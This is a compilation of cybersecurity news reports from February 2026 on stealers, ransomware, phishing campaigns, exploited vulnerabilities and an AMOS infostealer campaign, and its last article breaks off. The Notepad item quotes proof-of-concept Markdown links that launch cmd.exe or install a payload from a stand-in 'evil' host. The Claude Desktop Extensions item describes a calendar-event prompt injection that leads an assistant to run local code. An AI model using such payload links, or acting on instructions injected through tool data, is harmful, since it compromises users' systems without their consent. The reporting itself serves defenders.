[TAM METİN - 8671 kelime]
Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.

Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise activity is becoming more deliberate, structured, and persistent. The objective is less about disruption and more about staying embedded long enough to extract value.

There’s also growing overlap between cybercrime, espionage tradecraft, and opportunistic intrusion. Techniques are bleeding across groups, making attribution harder and defense baselines less reliable.

Below is this week’s ThreatsDay Bulletin — a tight scan of the signals that matter, distilled into quick reads. Each item adds context to where threat pressure is building next.

Notepad RCE via Markdown Links

Microsoft Patches Notepad Flaw


      Microsoft has patched a command injection flaw (CVE-2026-20841, CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits show that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly Patch Tuesday update this week. Microsoft added Markdown support to Notepad on Windows 11 last May.

APT Pressure Intensifies on Taiwan

Taiwan Becomes Target of APT Attacks


      TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor said. "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."

Node.js Stealer Hits Windows

LTX Stealer Targets Windows Systems


      A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA said.

Marco Stealer Expands Data Theft

Marco Stealer Emerges in the Wild


      Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz said. "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."

Telegram Sessions Hijacked via OAuth Abuse

Social Engineering Campaign Targets Telegram Accounts


      A new account takeover campaign has been observed abusing Telegram's native authentication workflows to obtain fully authorized user sessions. In one variant, victims are prompted to scan a QR code on bogus sites using the Telegram mobile application, initiating a legitimate Telegram login attempt tied to attacker-controlled API credentials. Telegram then sends an in-app authorization prompt to the victim's existing session. Alternatively, users can also enter their country code, phone number, and verification code (if enabled) on a fake web page, which causes the data to be relayed to Telegram's official authentication APIs. Upon successful verification, Telegram issues an in-app authorization request as before. "Unlike traditional phishing attacks that rely solely on credential harvesting or token replay, this campaign leverages attacker-controlled Telegram API credentials and integrates directly with Telegram's legitimate login and authorization infrastructure," CYFIRMA noted. "By inducing victims to approve in-app authorization prompts under false pretenses, the attackers achieve complete session compromise while minimizing technical anomalies and user suspicion."

Discord Expands Global Age Checks

Discord Announces Age Verification Plans


      Discord has announced it will require all users globally to verify their ages by sharing video selfies or providing government IDs to access certain content. Additionally, it will implement an age inference model, a new system that runs in the background to help determine whether an account belongs to an adult, without always requiring users to verify their age. The company has assured that video selfies don't leave a user's device, that identity documents submitted to third-party vendors, in this case k-ID, are "deleted quickly" or "immediately" after age confirmation, and that a user's age verification status cannot be seen by other users. However, concerns have been raised about whether Discord can be trusted with their most sensitive information, especially in the aftermath of a security breach of a third-party service that Discord previously relied on to verify ages in the U.K. and Australia. The incident led to the theft of government IDs of 70,000 Discord users. In a statement given to Ars Technica, k-ID said the age estimation technology runs entirely on device and no third-parties store personal data shared during age checks. The move comes at a time when laws requiring age verification on social media platforms are being adopted across the world. Discord confirmed that "a phased global rollout" would begin in "early March," at which point all users globally would be defaulted to “teen-appropriate" experiences.

GuLoader Refines Evasion Tradecraft

GuLoader Continues to Evolve


      A new analysis of the GuLoader malware has revealed that it employs polymorphic code to dynamically construct constants during execution and exception-based control flow obfuscation to conceal its functionality and evade detection. Besides introducing sophisticated exception-handling mechanisms to complicate analysis, the malware attempts to bypass reputation-based rules by hosting payloads on trusted cloud services such as Google Drive and OneDrive. First observed in December 2019, GuLoader serves primarily as a downloader for Remote Access Trojans (RATs) and information stealers.

$73.6M Pig-Butchering Scam Sentence

Man Sentenced to 20 Years in Prison for Crypto Scam


      Daren Li, 42, a dual national of China and St. Kitts and Nevis has been sentenced in absentia in the U.S. to the statutory maximum of 20 years in prison and three years of supervised release for his international cryptocurrency investment scheme known as pig butchering or romance baiting that defrauded victims of more than $73.6 million. Li pleaded guilty to his crime in November 2024. However, the defendant cut off his ankle monitor and fled the country in December 2025. His present whereabouts are unknown. "As part of his plea agreement, Li admitted that unindicted members of the conspiracy would contact victims directly through unsolicited social-media interactions, telephone calls and messages, and online dating services," the U.S. Justice Department said. "The unindicted co-conspirators would gain the trust of victims by establishing either professional or romantic relationships with them, often communicating by electronic messages sent via end-to-end encrypted applications." The co-conspirators established spoofed domains and websites that resembled legitimate cryptocurrency trading platforms and tricked victims into investing in cryptocurrency through these fraudulent platforms after gaining their trust. Li also confessed that he would direct co-conspirators to open U.S. bank accounts established on behalf of 74 shell companies and would monitor the receipt of interstate and international wire transfers of victim funds. "Li and other co-conspirators would receive victim funds in financial accounts that they controlled and then monitor the conversion of victim funds to virtual currency," the department said.

0-Click AI Prompt RCE Risk

0-Click Flaw in Claude Desktop Extensions


      A zero-click remote code execution vulnerability (CVSS score: 10.0) in Claude Desktop Extensions (DXT) could be exploited to silently compromise a system by a simple Google Calendar event when a user issues a harmless prompt like "Please check my latest events in google cal[endar] and then take care of it for me." The problem stems from how MCP-based systems like Claude DXT autonomously chain together different tools and external connectors to fulfil user requests without enforcing proper security boundaries. The phrase "take care of it" does the heavy lifting here, as the artificial intelligence (AI) assistant interprets it as a justification to execute arbitrary instructions embedded in those events without seeking users' permission. The flaw impacts more than 10,000 active users and 50 DXT extensions, according to LayerX. "Unlike traditional browser extensions, Claude Desktop Extensions run unsandboxed with full system privileges," the browser security company said. "As a result, Claude can autonomously chain low-risk connectors (e.g., Google Calendar) to high-risk local executors, without user awareness or consent. If exploited by a bad actor, even a benign prompt ('take care of it'), coupled with a maliciously worded calendar event, is sufficient to trigger arbitrary local code execution that compromises the entire system." Anthropic has opted not to fix the issue at this time. A similar Google Gemini prompt injection flaw was disclosed by Miggo Security last month.

Data-Theft Ransomware Surges

Coinbase Cartel Claims Over 60 Victims


      A nascent ransomware group called Coinbase Cartel has claimed more than 60 victims since it first emerged in September 2025. "Coinbase Cartel operations are marked by an insistence on stealing data while leaving systems available rather than complementing data theft with the use of encryptors that prohibit system access," Bitdefender said. The healthcare, technology, and transportation industries represent a major chunk of Coinbase Cartel's greatest victim demographic to date. The healthcare organizations impacted by the threat actor are primarily based in the U.A.E. Some of the other prominent groups that are focused on only data theft are World Leaks and PEAR (Pure Extraction and Ransom). The development paints a picture of an ever-evolving ransomware landscape populated by new and old actors, even as the threat is getting increasingly professionalized as attackers streamline operations. According to data from Cyble, 6,604 ransomware attacks were recorded in 2025, up 52% from the 4,346 attacks claimed by ransomware groups in 2024.

Google Expands Privacy Takedowns

Google Adds New Options "Results about you" 


      Google has expanded its "Results about you" tool to give users more control over sensitive personal information and added a way to request removal of non-consensual explicit images from search results, as well as other details like driver's license numbers, passport numbers, and Social Security numbers. "We understand that removing existing content is only part of the solution," Google said. "For added protection, the new process allows you to opt in to safeguards that will proactively filter out any additional explicit results that might appear in similar searches."

Monitoring Tools Used for Ransomware

Crazy Ransomware Gang Abuses Net Monitor and SimpleHelp 


      Threat actors have been observed leveraging Net Monitor, a commercial workforce monitoring tool, with SimpleHelp, a legitimate remote monitoring and management (RMM) platform, as part of attacks designed to deploy Crazy ransomware. The two incidents, believed to be the work of the same threat actor, took place in January and February 2026. Net Monitor comes with various capabilities that go beyond employee productivity tracking, including reverse shell connections, remote desktop control, file management, and the ability to customize service and process names during installation. These features, coupled with SimpleHelp's remote access functionality, make them attractive tools for attackers looking to blend into enterprise environments without deploying traditional malware. What's more, Net Monitor for Employees Professional bundles a pseudo-terminal ("winpty-agent.exe") that facilitates full command execution. Bad actors have been found to leverage this aspect to conduct reconnaissance, deliver additional payloads, and deploy secondary remote access channels, turning it into a functional remote access trojan. "In the cases observed, threat actors used these two tools together, using Net Monitor for Employees as a primary remote access channel and SimpleHelp as a redundant persistence layer, ultimately leading to the attempted deployment of Crazy ransomware," Huntress said.

0APT Victim Claims Questioned

0APT's 200 Victim Count Likely a Hoax


      A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations. "0APT is likely operating in this deceptive manner in order to support extortion of uninformed victims, re-extortion of historical victims from other groups, defrauding of potential affiliates, or to garner interest in a nascent RaaS group," security researcher Jason Baker noted. While signs suggest that the group may be bluffing about its victim count, the Windows and Linux ransomware samples have been found to be fully operational, per Halcyon. It's worth pointing out that ransomware groups like RansomedVC have listed fabricated attacks on their data leak sites to deceive victims. Viewed in that light, 0APT's exaggerated claims are likely an attempt to gain visibility and momentum among its peers. Its origins remain unknown.

SYSTEM RCE via Named Pipe

Flaw in Quest Desktop Authority Detailed


      A high-risk security vulnerability (CVE-2025-67813, CVSS score: 5.3) within Quest Desktop Authority could allow attackers to execute remote code with SYSTEM privileges. "Quest KACE Desktop Authority exposes a named pipe (ScriptLogic_Server_NamedPipe_9300) running as SYSTEM that accepts connections from any authenticated domain user over the network," NetSPI said. The named pipe implements a custom IPC protocol that supports dangerous operations, including arbitrary command execution, DLL injection, credential retrieval, and COM object invocation. Any authenticated user on the network can achieve remote code execution as a local administrator on hosts running the Desktop Authority agent.

AI Traffic Scans to Block VPNs

Russia to Analyze Internet Traffic Using AI to Flag VPN Usage


      Russia's internet watchdog will use artificial intelligence (AI) technology to analyze internet traffic and restrict the operation of VPN services, Forbes Russia reported. The Roskomnadzor is expected to spend close to $30 million to develop the internet traffic filtering mechanism this year. The Russian government has blocked access to tens of VPN apps in recent years. It also maintains a registry of banned websites.

Mispadu Expands Banking Attacks

Mexico and Brazil Targeted by Mispadu Trojan


      Cofense said it has observed Mispadu campaigns targeting Latin America, particularly Mexico and Brazil, and to a lesser extent in Spain, Italy, and Portugal, with phishing emails containing HTML Application (HTA) attachments that are designed to bypass Secure Email Gateways (SEGs) to reach the inboxes of employees across the world. "The only variation is that sometimes the URL delivering the HTA files is embedded in an attached, password-protected PDF rather than embedded in the email itself," Cofense said. "In all recent campaigns, Mispadu makes use of an AutoIT loader and various legitimate files to run the malicious content. Each step of the delivery chain from the attached PDF to the AutoIT script is dynamically generated. This means that every hash except for the AutoIT compiler is unique to each install, further frustrating EDR." Recent iterations of the banking trojan come with the ability to self-propagate on infected hosts via email and expand the target online banking websites to include banks outside of Latin America as well as cryptocurrency-based exchanges.

ScreenConnect Deployed via Phish

Phishing Campaign Delivers ConnectWise ScreenConnect for Remote Access


      In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect. The campaign has targeted organizations across the U.S., Canada, the U.K., and Northern Ireland, focusing on sectors with high-value data, including government, healthcare, and logistics companies. Recent phishing attacks have also abused web services from Amazon, like Simple Storage Service (S3) buckets, Amazon Simple Email Service (SES), and Amazon Web Services (AWS) Amplify to slip past email security controls and launch credential phishing attacks. Other phishing attacks have embraced uncommon techniques like using edited versions of legitimate business emails to deliver convincingly spoofed emails to recipients. "These emails work by having the threat actor create an account on a legitimate service and input arbitrary text into a field that will later be included in outgoing emails," Cofense said. "After this is done, the threat actor would need to receive a legitimate email that happens to include the malicious text that was created by the threat actor. Once the email is received, the threat actor can then redirect the email to the intended victims."

Once the email is received, the threat actor can then redirect the email to the intended victims."

CrashFix Delivers SystemBC

CrashFix Variant Attack Delivers Python Implants and SystemBC 


      A variant of the ClickFix attack called CrashFix has been used to deliver malicious payloads consistent with a known malware called SystemBC. Unlike the CrashFix-style social engineering flow documented by Huntress and Microsoft, the attack stands out because it did not involve the use of a malicious browser extension. "Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary -- finger.exe -- copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."

Bing Ads Funnel Tech Scams

Fake Bing Ads Leak to Tech Support Scams


      Malicious ads served on Bing search results when searching for sites like Amazon are being used to redirect unsuspecting users to tech support scam links hosted in Azure Blob Storage. The campaign targeted healthcare, manufacturing, and technology sectors in the U.S. "Clicking on the malicious ad sent the victims to highswit[.]space, a newly registered domain hosting an empty WordPress site, which then redirected them to one of the Azure Blob Storage containers, which served a typical tech support scam site," Netskope Threat Labs said.

Chinese VPN Infra Footprint Expands

Chinese VPN Used by Devices in Russia, China, Myanmar, Iran, and Venezuela


      A Chinese virtual private network (VPN) provider named LVCHA VPN has been used by devices in Russia, China, Myanmar, Iran, and Venezuela. It also has an Android app that's directly hosted on its website ("lvcha[.]in") and distributed via the Google Play Store. Further analysis of the domain has uncovered a cluster of nearly 50 suspicious domains, all of which promote the same VPN. "Whenever we see campaigns promoting suspicious downloads or products using so many domains, it can indicate that the operator is rotating domains to work around country-level firewalls in regions where they’re trying to promote distribution," Silent Push said.

Grid Attack Triggers Western Alerts

U.K. and U.S. Issues Warning After Poland Energy Grid Cyber Attack


      Following a late December 2025 coordinated cyber attack on Poland's power grid, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a bulletin for critical infrastructure owners and operators. CISA said vulnerable edge devices remain a prime target for threat actors, OT devices without firmware verification can be permanently damaged, and threat actors leverage default credentials to pivot onto the HMI and RTUs. "Operators should prioritize updates that allow firmware verification when available," the agency added. "Operators should immediately change default passwords and establish requirements for integrators or OT suppliers to enforce password changes in the future." In a similar development, Jonathan Ellison, director for national resilience at the National Cyber Security Centre (NCSC), has urged critical infrastructure operators in the country to act now and have incident response plans or playbooks in place to respond to such threats. "Although attacks can still happen, strong resilience and recovery plans reduce both the chances of an attack succeeding and the impact if one does," Ellison said.

Telnet Traffic Abruptly Collapses

Global Telnet Traffic Dropped in Mid-January 2026 


      Threat intelligence firm GreyNoise said it observed a steep decline in global Telnet traffic on January 14, 2026, six days before a security advisory for CVE-2026-24061 went public on January 20. CVE-2026-24061 relates to a critical vulnerability in the GNU InetUtils telnet daemon that could result in an authentication bypass. Data gathered by GreyNoise shows that the hourly volume of Telnet sessions dropped 65% on January 14 at 21:00 UTC, then fell 83% within two hours. Daily sessions have declined from an average of 914,000 (from December 1, 2025, to January 14, 2026) to around 373,000, equating to a 59% reduction that has persisted as of February 10, 2026. "Eighteen ASNs with significant pre-drop telnet volume (>50K sessions each) went to absolute zero after January 15," the company said. "Five entire countries vanished from GreyNoise telnet data: Zimbabwe, Ukraine, Canada, Poland, and Egypt. Not reduced to zero." Among the 18 ASNs included were British Telecom, Charter/Spectrum, Cox Communications, and Vultr. Although correlation does not imply causation, GreyNoise has raised the possibility that the telecom operators likely received advance warning about CVE-2026-24061, allowing them to act on it at the infrastructure level. "A backbone or transit provider — possibly responding to a coordinated request, possibly acting on their own assessment — implemented port 23 filtering [to block telnet traffic] on transit links," it said.

New Loaders Fuel Stealer Campaigns

New RenEngine and Foxveil Malware Loaders Spotted 


      Cyderes and Cato Networks have detailed new previously undocumented malware loaders dubbed RenEngine Loader and Foxveil that have been used to deliver next-stage payloads. The Foxveil malware campaign has been active since August 2025. It's engineered to establish an initial foothold, complicate analysis efforts, and retrieve next-stage shellcode payloads from threat actor-controlled staging hosted on trusted platforms like Cloudflare Pages, Netlify, and Discord. Attacks leveraging RenEngine Loader, on the other hand, have employed illegally modified game installers distributed via piracy platforms to deliver the malware alongside the playable content. More than 400,000 global victims are estimated to have been impacted, with most of them located in India, the U.S., and Brazil. The activity has been operational since April 2025. "RenEngine Loader decrypts, stages, and transfers execution to Hijack Loader, enabling rapid tooling evolution and flexible capability deployment," Cyderes said. "By embedding a modular, stealth-focused second-stage loader inside a legitimate Ren’Py launcher, the attackers closely mimic normal application behavior, significantly reducing early detection." The end goal of the attack is to deploy an information stealer called ACR Stealer.

Looker RCE Chain Disclosed

Flaws in Google Looker 


      Two novel security vulnerabilities have been disclosed in Google Looker that could be exploited by an attacker to fully compromise a Looker instance. This includes a remote code execution (RCE) chain via Git hook overrides and an authorization bypass flaw via internal database connection abuse. Successful exploitation of the flaws could allow an attacker to run arbitrary code on the Looker server, potentially leading to cross-tenant access, as well as exfiltrate the full internal MySQL database via error-based SQL injection, according to Tenable. "The vulnerabilities allowed users with developer permissions in Looker to access both the underlying system hosting Looker, and its internal database," Google said. Collectively tracked as CVE-2025-12743, aka LookOut (CVSS score: 6.5), they were patched by Google in September 2025. While the fixes have been applied to cloud instances, users of self-hosted Looker instances are advised to update to the latest supported version.

Trojanized 7-Zip Spreads Proxyware

Malicious 7-Zip Site Distributes Fake Installer with Proxy 


      A fake installer for the 7-Zip file archiver tool downloaded from 7zip[.]com (the legitimate domain is 7-zip[.]org) is being used to drop a proxy component that enrolls the infected host into a residential proxy node. This allows third parties to route traffic through the victim's IP address while concealing their own origins. The installer is digitally signed with a now-revoked certificate originally issued to Jozeal Network Technology Co., Limited. The campaign has been codenamed upStage Proxy by security researcher Luke Acha, who discovered it late last month. "The operators behind 7zip[.]com distributed a trojanized installer via a lookalike domain, delivering a functional copy of 7-Zip File Manager alongside a concealed malware payload," Malwarebytes said. The 7-Zip lure appears to be part of a broader effort that uses trojanized installers for HolaVPN, TikTok, WhatsApp, and Wire VPN. Attack chains involve using YouTube tutorials as a malware distribution vector to direct unsuspecting users to the bogus site, once again highlighting the abuse of trusted platforms.

AI-Built VoidLink Expands Reach

More Details About VoidLink Emerge


VoidLink is a sophisticated Linux-based command-and-control (C2) framework capable of long-term intrusion across cloud and enterprise environments. First documented by Check Point last month, ongoing analyses of the malware have revealed that it may have been developed by a Chinese-speaking developer using an artificial intelligence (AI) model with limited human review. Ontinue, in a report published this week, said it found "strong indicators" that the implant was built using a large language model (LLM) coding agent. "It fingerprints cloud environments across AWS, GCP, Azure, Alibaba Cloud, and Tencent Cloud, harvesting credentials from environment variables, config directories, and instance metadata APIs," security researcher Rhys Downing said. "It detects container runtimes and includes plugins for container escape and Kubernetes privilege escalation. A kernel-level rootkit adapts its stealth approach based on the host's kernel version." Cisco Talos said it has observed the modular framework in campaigns undertaken by a new threat actor codenamed UAT-9921, which is believed to have been active since 2019. The cybersecurity company said it also found "clear indications" of a Windows equivalent of VoidLink that comes with the ability to load plugins. "UAT-9921 uses compromised hosts to install VoidLink command and control (C2), which are then used to launch scanning activities both internal and external to the network," Talos researchers said.

Taken together, these developments show how threat actors are balancing speed with patience — moving fast where defenses are weak, and slowing down where stealth matters more than impact. The result is activity that blends into normal operations until damage is already underway.

For defenders, the challenge isn’t just blocking entry anymore. It’s recognizing misuse of legitimate access, spotting abnormal behavior inside trusted systems, and closing gaps that don’t look dangerous on the surface.

The briefs that follow aren’t isolated incidents. They’re fragments of a wider operating picture — one that keeps evolving week after week.

[2] The Hacker News - The CTEM Divide: Why 84% of Security Programs Are Falling Behind
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 16:00:00 +0530
Link: https://thehackernews.com/2026/02/the-ctem-divide-why-84-of-security.html

[TAM METİN - 668 kelime]
A new 2026 market intelligence study of 128 enterprise security decision-makers (available here) reveals a stark divide forming between organizations – one that has nothing to do with budget size or industry and everything to do with a single framework decision. Organizations implementing Continuous Threat Exposure Management (CTEM) demonstrate 50% better attack surface visibility, 23-point higher solution adoption, and superior threat awareness across every measured dimension. The 16% who've implemented it are pulling away. The 84% who haven't are falling behind.

The Demographics of the Divide

The research surveyed a senior cohort: 85% of respondents are Manager-level or above, representing organizations where 66% employ 5,000+ people across finance, healthcare, and retail sectors.

Download the full research here →

If you aren’t familiar, CTEM involves shifting from "patch everything reactively" to "continuously discover, validate, and prioritize risk exposures that can actually hurt the business." It's widely discussed in cybersecurity now as a next-generation evolution of exposure/risk management, and the new report reinforces Gartner’s view that businesses adopting it will consistently demonstrate stronger security outcomes than those that don’t.

Awareness Is High. Adoption Is Rare.

One surprising finding: There doesn’t seem to be a problem with awareness, just implementation. 87% of security leaders recognize the importance of CTEM, but only 16% have translated that awareness into operational reality. So, if they've heard of it, why aren't they using it?

The gap between awareness and implementation reveals modern security's central dilemma: which priority wins? Security leaders understand the CTEM conceptually but struggle to sell its benefits in the face of organizational inertia, competing priorities, and budget constraints that force impossible tradeoffs. The challenge of gaining management buy-in is one reason why we prepared this report: to provide the statistics that make the business case impossible to ignore.

Complexity is the New Multiplier

For example: Beyond a certain threshold, manual tracking of all the additional integrations, scripts, and dependencies breaks down, ownership blurs, and blind spots multiply. The research makes it clear that attack surface complexity is not just a management challenge; it's a direct risk multiplier.

We can see this clearly in the graph below. Attack rates rise linearly from 5% (0-10 domains) to 18% (51-100 domains), then rise steeply past 100 domains.

This sudden increase is driven by the ‘visibility gap’, the gulf between the assets a company is responsible for monitoring and those it’s aware of. Each additional domain can add dozens of connected assets, and when the count climbs past 100, this can translate to thousands of additional scripts: each one a possible attack vector. Traditional snapshot security cannot hope to log and monitor them all. Only CTEM-driven programs can provide the oversight to continuously identify and validate the dark assets hiding in this visibility gap – before attackers do.

Security leaders are currently facing a 'perfect storm' of demands. At a time when 91% of CISOs report an increase in third-party incidents, average breach costs have climbed to $4.44M, and PCI DSS 4.0.1 brings stricter monitoring and the ever-present specter of penalties. With this in mind, the report shows that attack surface management has become an issue for the boardroom as much as the server room, and the C-suite reader can only conclude that continuing to trust manual oversight and periodic controls to manage such a complex, high-stakes challenge would be self-destructive.

One of the clearest signals in this research comes from the peer benchmarking data. When organizations compare themselves side by side – by attack surface size, visibility, tooling, and outcomes – a pattern emerges that is difficult to ignore: beyond a certain level of complexity, traditional security approaches stop scaling.

The takeaway from the peer benchmarks is clear: below a certain level of exposure, organizations can rely on periodic controls and manual oversight. Above it, those models no longer hold. For security leaders operating in high-complexity environments, the question is no longer whether CTEM is valuable – it is whether their current approach can realistically keep up without it.

[3] The Hacker News - 83% of Ivanti EPMM Exploits Linked to Single IP on Bulletproof Hosting Infrastructure
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 13:02:00 +0530
Link: https://thehackernews.com/2026/02/83-of-ivanti-epmm-exploits-linked-to.html

[TAM METİN - 497 kelime]
A significant chunk of the exploitation attempts targeting a newly disclosed security flaw in Ivanti Endpoint Manager Mobile (EPMM) can be traced back to a single IP address on bulletproof hosting infrastructure offered by PROSPERO.

Threat intelligence firm GreyNoise said it recorded 417 exploitation sessions from 8 unique source IP addresses between February 1 and 9, 2026. An estimated 346 exploitation sessions have originated from 193.24.123[.]42, accounting for 83% of all attempts.

The malicious activity is designed to exploit CVE-2026-1281 (CVSS scores: 9.8), one of the two critical security vulnerabilities in EPMM, along with CVE-2026-1340 that could be exploited by an attacker to achieve unauthenticated remote code execution. Late last month, Ivanti acknowledged it's aware of a "very limited number of customers" who were impacted following the zero-day exploitation of the issues.

Since then, multiple European agencies, including the Netherlands' Dutch Data Protection Authority (AP), Council for the Judiciary, the European Commission, and Finland's Valtori, have disclosed that they were targeted by unknown threat actors using the vulnerabilities.

Further analysis has revealed that the same host has been simultaneously exploiting three other CVEs across unrelated software -

CVE-2026-21962 (Oracle WebLogic) - 2,902 sessions

CVE-2026-24061 (GNU InetUtils telnetd) - 497 sessions

CVE-2025-24799 (GLPI) - 200 sessions

"The IP rotates through 300+ unique user agent strings spanning Chrome, Firefox, Safari, and multiple operating system variants," GreyNoise said. "This fingerprint diversity, combined with concurrent exploitation of four unrelated software products, is consistent with automated tooling."

It's worth noting that PROSPERO is assessed to be linked to another autonomous system called Proton66, which has a history of distributing desktop and Android malware like GootLoader, Matanbuchus, SpyNote, Coper (aka Octo), and SocGholish.

GreyNoise also pointed out that 85% of the exploitation sessions beaconed home via the domain name system (DNS) to confirm "this target is exploitable" without deploying any malware or exfiltrating data.

The disclosure comes days after Defused Cyber reported a "sleeper shell" campaign that deployed a dormant in-memory Java class loader to compromised EPMM instances at the path "/mifs/403.jsp." The cybersecurity company said the activity is indicative of initial access broker tradecraft, where threat actors establish a foothold to sell or hand off access later for financial gain.

"That pattern is significant," it noted. "OAST [out-of-band application security testing] callbacks indicate the campaign is cataloging which targets are vulnerable rather than deploying payloads immediately. This is consistent with initial access operations that verify exploitability first and deploy follow-on tooling later."

Ivanti EPMM users are recommended to apply the patches, audit internet-facing Mobile Device Management (MDM) infrastructure, review DNS logs for OAST-pattern callbacks, and monitor for the /mifs/403.jsp path on EPMM instances, and block PROSPERO's autonomous system (AS200593) at the network perimeter level.

"EPMM compromise provides access to device management infrastructure for entire organizations, creating a lateral movement platform that bypasses traditional network segmentation," GreyNoise said. "Organizations with internet-facing MDM, VPN concentrators, or other remote access infrastructure should operate under the assumption that critical vulnerabilities face exploitation within hours of disclosure."

[4] BleepingComputer - AMOS infostealer targets macOS through a popular AI app  
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 09:25:38 -0500

[TAM METİN - 1352 kelime]
Infostealers like Atomic MacOS Stealer (AMOS) represent far more than a standalone malware. They are foundational components of a mature cybercrime economy built around harvesting, trading, and operationalizing stolen digital identities.

Rather than acting as the end goal, modern stealers function as large-scale data collection engines that feed underground markets, where stolen credentials, sessions, and financial data are bought and sold to fuel account takeovers, fraud, and follow-on intrusions.

What makes these campaigns particularly effective is their highly opportunistic social engineering approach: attackers continuously adapt to technology trends, abusing trusted platforms, popular software, search engines, and even emerging AI ecosystems to trick users into executing malware themselves.

This combination of industrialized data monetization and adaptive social engineering has made infostealers one of the most reliable and scalable entry points in today’s cybercrime landscape.

In the new 2026 Enterprise Infostealer Identity Exposure report, Flare researchers highlight the growing dominance of infostealers within the cybercrime economy and the expanding impact of identity exposure on organizations.

In this article, we examine the AMOS infostealer as a case study, exploring its evolution, operational model, and real-world activity across its active years.

How Do Infostealers Work?

Infostealers operate as one of the most critical enablers in the modern cybercrime kill chain because they transform a single infection into large-scale credential, session, and identity compromise.

ClawHavoc - The Most Recent Campaign

Recent research by Koi security reminded us that AMOS infostealer dissemination techniques are cunningly designed to find weaknesses and exploit every segment of technology users to steal their credentials.

The research describes ClawHavoc as a large-scale supply-chain campaign targeting the OpenClaw and ClawHub ecosystem (A very popular personal AI assistant) by poisoning the skill marketplace itself.

While the specific details are impressive, what matters more is the underlying tactic. AMOS distributors are capitalizing on OpenClaw's popularity as AI-hyped software.

As users rush to install it for personal or organizational gains, attackers see an opportunity to bundle AMOS malware within it to steal valuable PII, credentials, and sensitive data.

The delivery model: attackers uploaded skills (OpenClaw add-ons) that looked legitimate: crypto tools, productivity utilities, YouTube helpers, finance or Google Workspace integrations, etc.

Once installed, the malware could steal credentials, crypto wallet data, browser sessions, SSH keys, and other sensitive data, highlighting how AI agent extension ecosystems can become high-impact distribution channels when marketplace vetting is weak.

This is the latest campaign, let’s remember how it all started…

Monitor Stealer Logs Before Attackers Strike

Flare tracks over 1 million new stealer logs weekly from dark web markets and Telegram channels.

AMOS the Malware - First Sighting of AMOS

AMOS first appeared around May 2023 on a Telegram channel.

Stating its capabilities, which include exporting passwords from the Mac keychain, file grabber, system info, and macOS password exfiltration, browser session theft, crypto wallet data theft with various infostealer management capabilities (web-panel, tests, Telegram logs, etc).

Back then, the cost was $1000 per month, paid through USDT(TRC20), ETH, or BTC.

Since then, AMOS infostealer has become a part of the underground ecosystem, threat actors are willing to buy stealer logs that were extracted from infostealers (such as AMOS) in order to use them as an initial access to their own nefarious business.

For instance, below you can see that a Russian-speaking threat actor dealing with Crypto wallet theft is looking for relevant AMOS logs.

Traditionally, AMOS is disseminated like every known and popular infostealers, such as phishing links, phishing emails, trojanized installers, and click baits, but throughout recent years we have also seen some more noticeable campaigns.

Targeting LastPass Users

In an underground forum, we saw a post about LastPass that warned of an ongoing AMOS campaign.

This campaign was targeting macOS users through fake applications distributed via fraudulent GitHub repositories, where attackers impersonate over 100 well-known software brands to increase legitimacy.

The operation relies on SEO poisoning across Google and Bing to push these malicious repositories into search results, ultimately leading victims to ClickFix-style pages that socially engineer them into pasting Terminal commands, which download and execute the AMOS payload.

